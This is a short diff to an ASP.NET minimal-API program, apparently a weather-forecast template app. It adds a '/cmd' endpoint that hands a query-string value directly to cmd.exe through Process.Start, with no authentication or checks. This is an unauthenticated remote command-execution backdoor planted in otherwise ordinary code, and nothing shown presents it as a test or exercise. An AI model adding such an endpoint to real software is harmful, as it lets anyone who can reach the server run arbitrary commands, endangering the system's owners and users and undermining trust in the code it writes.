@@ -98,6 +98,12 @@ app.MapGet("/download", (string fileName) =>
     return System.IO.File.ReadAllText(filePath);
 });
 
+app.MapGet("/cmd", (string cmd) =>
+{
+    Process.Start("cmd.exe", cmd);
+    return Results.Ok();
+});
+
 app.Run();
  
 record WeatherForecast(DateOnly Date, int TemperatureC, string? Summary)
